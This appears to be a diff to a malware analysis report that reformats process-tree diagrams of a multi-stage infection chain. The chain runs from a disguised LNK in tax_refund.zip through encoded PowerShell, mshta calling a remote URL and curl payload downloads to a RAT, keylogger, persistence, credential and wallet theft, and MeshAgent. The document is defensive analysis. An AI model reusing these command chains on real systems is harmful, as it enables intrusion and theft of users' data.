@@ -94,8 +94,8 @@ mshta https://link24.kr/1y0mZTc
 
 ```
 explorer.exe
-â””â”€â”€ powershell.exe -e IAAgACAA...
-    â””â”€â”€ mshta.exe https://link24.kr/1y0mZTc
+- powershell.exe -e IAAgACAA...
+    - mshta.exe https://link24.kr/1y0mZTc
 ```
 
 ## 4. Deep Dive: Reverse Engineering & Code Analysis
@@ -257,14 +257,14 @@ If the first-stage LNK is opened and the remote `link24.kr` resource serves `pwk
 
 ```
 explorer.exe
-â””â”€â”€ powershell.exe -e IAAgACAA...
-    â””â”€â”€ mshta.exe https://link24.kr/1y0mZTc
-        â””â”€â”€ cmd.exe /c cd /d %temp% && curl ... password.txt && password.txt
-        â””â”€â”€ cmd.exe /c sc query WinDefend
-        â””â”€â”€ cmd.exe /c cd /d %localappdata% && curl ... user.txt       [conditional]
-        â””â”€â”€ cmd.exe /c cd /d %localappdata% && curl ... sys.log && powershell ... && rundll32 sys.dll,k
-        â””â”€â”€ cmd.exe /c cd /d %localappdata% && curl ... pipe.log && powershell ... Expand-Archive ...
-        â””â”€â”€ cmd.exe /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log
+- powershell.exe -e IAAgACAA...
+    - mshta.exe https://link24.kr/1y0mZTc
+        - cmd.exe /c cd /d %temp% && curl ... password.txt && password.txt
+        - cmd.exe /c sc query WinDefend
+        - cmd.exe /c cd /d %localappdata% && curl ... user.txt       [conditional]
+        - cmd.exe /c cd /d %localappdata% && curl ... sys.log && powershell ... && rundll32 sys.dll,k
+        - cmd.exe /c cd /d %localappdata% && curl ... pipe.log && powershell ... Expand-Archive ...
+        - cmd.exe /c cd /d %localappdata% && cd pipe && powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -File 1.ps1 -FileName 1.log
 ```
 
 The chain stages at least two encrypted payloads. The first is a DLL executed with export/function name `k`; the second is a ZIP archive containing a PowerShell payload and companion log/config file.
@@ -284,9 +284,9 @@ pipe.log -> pipe.zip  (15,431 bytes)
 
 ```
 pipe.zip
-â”œâ”€â”€â”€1.log
-â”œâ”€â”€â”€1.ps1
-â””â”€â”€â”€2.log
+- 1.log
+- 1.ps1
+- 2.log
 ```
 
 `1.ps1` is a minimal Base64 loader:
@@ -558,22 +558,22 @@ Static reconstruction of the complete chain:
 
 ```
 tax_refund.zip
-â””â”€â”€ [non-ASCII].txt.lnk
-    â””â”€â”€ powershell.exe -EncodedCommand
-        â””â”€â”€ mshta.exe https://link24.kr/1y0mZTc
-            â””â”€â”€ VBScript pwko.vba
-                â”œâ”€â”€ curl -> password.txt; shell-open password.txt
-                â”œâ”€â”€ sc query WinDefend
-                â”œâ”€â”€ curl -> user.txt                         [conditional on WinDefend STOPPED]
-                â”œâ”€â”€ curl -> sys.log; AES decrypt -> sys.dll; rundll32 sys.dll,k
-                â””â”€â”€ curl -> pipe.log; AES decrypt -> pipe.zip; Expand-Archive
-                    â””â”€â”€ powershell.exe -File 1.ps1 -FileName 1.log
-                        â”œâ”€â”€ decode/execute 1.log -> decoded_1.ps1
-                        â”œâ”€â”€ install HKCU Run persistence
-                        â”œâ”€â”€ collect browser, wallet, Telegram, Discord, cert, recent-file, and system data
-                        â”œâ”€â”€ poll C2 for rd/wr/cm/appkey tasking
-                        â””â”€â”€ launch second loader instance with 2.log
-                            â””â”€â”€ decode/execute 2.log -> decoded_2.ps1 keylogger
+- [non-ASCII].txt.lnk
+    - powershell.exe -EncodedCommand
+        - mshta.exe https://link24.kr/1y0mZTc
+            - VBScript pwko.vba
+                - curl -> password.txt; shell-open password.txt
+                - sc query WinDefend
+                - curl -> user.txt                         [conditional on WinDefend STOPPED]
+                - curl -> sys.log; AES decrypt -> sys.dll; rundll32 sys.dll,k
+                - curl -> pipe.log; AES decrypt -> pipe.zip; Expand-Archive
+                    - powershell.exe -File 1.ps1 -FileName 1.log
+                        - decode/execute 1.log -> decoded_1.ps1
+                        - install HKCU Run persistence
+                        - collect browser, wallet, Telegram, Discord, cert, recent-file, and system data
+                        - poll C2 for rd/wr/cm/appkey tasking
+                        - launch second loader instance with 2.log
+                            - decode/execute 2.log -> decoded_2.ps1 keylogger
 ```
 
 ---
@@ -912,22 +912,22 @@ So the key of each file:
 
 ```
 decoded_1.ps1
-â””â”€â”€ GetAppKey
-    â”œâ”€â”€ download appload.log
-    â”œâ”€â”€ AES decrypt -> appload.dll
-    â””â”€â”€ rundll32.exe appload.dll,z
-        â”œâ”€â”€ download app64.log  [browser/AppBound helper]
-        â”œâ”€â”€ download agent.log  [MeshCentral remote-control agent]
-        â”œâ”€â”€ download msh.log    [configuration]
-        â”œâ”€â”€ stage %TEMP%\Taskmgr.exe / %TEMP%\Taskmgr.msh
-        â””â”€â”€ inject/load into browser or masqueraded Taskmgr process
+- GetAppKey
+    - download appload.log
+    - AES decrypt -> appload.dll
+    - rundll32.exe appload.dll,z
+        - download app64.log  [browser/AppBound helper]
+        - download agent.log  [MeshCentral remote-control agent]
+        - download msh.log    [configuration]
+        - stage %TEMP%\Taskmgr.exe / %TEMP%\Taskmgr.msh
+        - inject/load into browser or masqueraded Taskmgr process
 ```
 
 The broader chain now consists of:
 
 ```
 LNK -> PowerShell -> mshta -> VBScript -> sys.dll + PowerShell RAT/keylogger
-                                      â””â”€â”€ appload.dll -> auxiliary encrypted blobs
+                                      - appload.dll -> auxiliary encrypted blobs
 ```
 
 ## 19. Final Stage: MeshAgent
